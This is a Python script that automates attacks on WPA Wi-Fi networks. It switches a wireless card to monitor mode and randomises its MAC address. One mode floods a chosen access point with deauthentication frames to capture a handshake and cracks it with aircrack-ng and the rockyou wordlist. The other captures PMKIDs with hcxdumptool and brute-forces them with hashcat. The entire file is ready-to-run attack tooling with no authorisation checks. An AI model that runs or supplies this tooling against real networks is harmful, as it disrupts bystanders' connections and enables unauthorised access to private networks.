import sys
import os
import subprocess
import time
import signal
from colorama import Fore


def ctrl_c(signum, frame):
    get_colours("\n[!] Stopping attack...", "mangeta")
    get_colours("\n[!] Clearing Temporary files..", "red")
    get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "yellow")
    os.system("rm -rf Cap*")
    time.sleep(2)
    get_colours("\n[*] Exiting the program...", "blue")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "yellow":
        yellow_color = Fore.YELLOW + text
        print(yellow_color)
    elif color == "magenta":
        magenta_color = Fore.MAGENTA + text
        print(magenta_color)
    elif color == "cyan":
        cyan_color = Fore.CYAN + text
        print(cyan_color)


def menu_panel():
    get_colours("\n[*] Usage: sudo python3 " + sys.argv[0] + " <Network InterFace> <parameters>", "green")
    get_colours("\n(-n) Network card name", "yellow")
    get_colours("(-a)  Attack mode", "yellow")
    get_colours(f"\t Handshake", "cyan")
    get_colours(f"\t PKMID", "cyan")
    get_colours("(-h) Help Panel", "yellow")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def check_deps():
    subprocess.run(["clear"])
    program_status = False
    get_colours("\nChecking necessary programs...", "cyan")
    # Check Mac-Changer
    check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
    if "/usr/bin/macchanger" in check_macchanger.stdout or "/usr/sbin/macchanger" in check_macchanger.stdout:
        get_colours(f"\nMacchanger\t\t {Fore.GREEN + '(V)'}", "magenta")
        program_status = True
    else:
        program_status = False
        get_colours(f"\nMacchanger \t\t {Fore.RED + '(X)'}", "red")
        get_colours("Installing [Macchanger]....", "magenta")
        install_macchanger = subprocess.run(["sudo", "apt", "install", "macchanger", "-y"], capture_output=True,
                                            text=True)
        if "Setting up macchanger" in install_macchanger.stdout:
            get_colours("\n[*] Macchanger Installed...", "blue")
            program_status = True
    # Check Airmon-Ng
    check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
    if "/usr/bin/airmon-ng" in check_airmon_ng.stdout or "/usr/sbin/airmon-ng" in check_airmon_ng.stdout:
        get_colours(f"\nAirmon-ng \t\t {Fore.GREEN + '(V)'}", "magenta")
        program_status = True
    else:
        program_status = False
        get_colours(f"\nAirmon-ng \t\t {Fore.RED + '(X)'}", "red")
        get_colours("\nInstalling [Airmon-ng]....", "magenta")
        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "airmon-ng", "-y"], capture_output=True,
                                           text=True)
        if "Setting up airmon-ng" in install_airmon_ng.stdout:
            get_colours("\n[*] Airmon-ng Installed...", "blue")
            program_status = True
    # Check hcxdumptool
    check_hcxdumptool = subprocess.run(["which", "hcxdumptool"], capture_output=True, text=True)
    if "/usr/bin/hcxdumptool" in check_hcxdumptool.stdout or "/usr/sbin/hcxdumptool" in check_hcxdumptool.stdout:
        get_colours(f"\nhcxdumpTool \t\t {Fore.GREEN + '(V)'}", "magenta")
        program_status = True
    else:
        program_status = False
        get_colours(f"\nhcxdumpTool \t\t {Fore.RED + '(X)'}", "red")
        get_colours("\nInstalling [hcxdumpTool]....", "magenta")
        install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
                                         text=True)
        subprocess.run(["sudo", "apt", "install", "hcxtools"])
        if "Setting up hcxdumptool" in install_hcxdump.stdout:
            get_colours("\n[*] hcxdumpTool Installed...", "blue")
            program_status = True
    if program_status:
        attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
    else:
        get_colours(f"\n[!] There was an error installing the necessary programs, Please install the following"
                    f" programs manually: ", 'red')
        get_colours(f"\n1. airmon-ng", "cyan")
        get_colours(f"2. macchanger", "cyan")
        get_colours(f"3. hcxdumptool\n", "cyan")
        print(Fore.WHITE)


def attack_func(network_interface, attack_mode):
    time.sleep(1)
    subprocess.run(["clear"])
    get_colours("\nSetting up network card...", "yellow")
    subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
    get_colours("\nGenerating new Mac Address...", "cyan")
    time.sleep(3)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)

    get_colours("\nNew Mac Address Generated ", "blue")
    time.sleep(1)
    subprocess.run(["clear"])
    # HandShake Attack Mode
    if attack_mode == "Handshake":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        # subprocess.run(["killall", "dhclient", "wpa_supplicant"], stdout=subprocess.DEVNULL)
        os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
        airodump_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
        access_point_name = input(Fore.YELLOW + "Access point name: ")
        access_point_channel = input(Fore.YELLOW + "Channel name: ")
        if airodump_pid.stdout != "0":
            os.system(f"sudo kill {airodump_pid.stdout}")
        time.sleep(1)
        os.system(
            f"xterm -hold -e airodump-ng -c {access_point_channel} --write HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
        time.sleep(4)
        os.system(
            f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
        aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
        time.sleep(40)
        if aireplay_pid.stdout != "0":
            os.system(f"sudo kill {aireplay_pid.stdout}")
        time.sleep(4)
        airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
        os.system(f"sudo kill {airodump_pid_handshake.stdout}")
        os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
    # PKMID Attack Mode
    elif attack_mode == "PKMID":
        subprocess.run(["clear"])
        time.sleep(1)
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        get_colours("[*] Starting the PKMID Client-Less ATTACK", "magenta")
        time.sleep(3)
        get_colours("", "yellow")
        process = subprocess.Popen(["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
        try:
            process.wait(timeout=5)  # Time for the process
        except subprocess.TimeoutExpired:
            print('\n[!] Timed out - killing process ID - ', process.pid)
            process.kill()
        time.sleep(2)
        subprocess.run(["clear"])
        get_colours("\n[!] Clearing Temporary files..", "red")
        print(Fore.WHITE)
        time.sleep(3)
        get_colours("", "yellow")
        subprocess.run(["clear"])
        get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
                                          capture_output=True, text=True, shell=True)
        subprocess.run(["clear"])
        time.sleep(2)
        get_colours("\n[*] Trying getting hashes", "magenta")
        subprocess.run(["rm", "Capture_PKMID"])
        time.sleep(2)
        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
            get_colours("\nStarting with Brute-Force attack..", "cyan")
            time.sleep(3)
            get_colours("", "yellow")
            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
                            "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
        else:
            os.system('clear')
            get_colours("\n[-] no packet captured...", "red")
            time.sleep(2)
            os.system('clear')
            quit_program()


def quit_program():
    get_colours("\n[!] Clearing Temporary files..", "red")
    os.system("rm -rf Cap*")
    time.sleep(2)
    get_colours("\n[!] Exiting the program...", "blue")
    get_colours("\nSetting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("[*] Network set to it's normal mode...", "magenta")
    print(Fore.WHITE)
    exit(0)


def check_parms():
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h":
            menu_panel()
        elif len(sys.argv) > 2:
            if len(sys.argv) > 3:
                if len(sys.argv) > 4:
                    check_interface_exist = subprocess.run(["ip", "a"], capture_output=True, text=True)
                    check_attack_mode = ["Handshake", "PKMID"]
                    if sys.argv[2] not in check_interface_exist.stdout:
                        get_colours("\nInvalid Network Interface name (Ej: wlan0 / eth0)", "red")
                        print(Fore.WHITE)
                    elif sys.argv[4] not in check_attack_mode:
                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
                        print(Fore.WHITE)
                    else:
                        check_deps()  # Check for neccesary program to run this script.
                else:
                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
                    print(Fore.WHITE)
            else:
                get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
                print(Fore.WHITE)
        else:
            get_colours("\nSelect a valid Interface (wlan0 / eth0)", "red")
            print(Fore.WHITE)
    else:
        menu_panel()


check_parms()
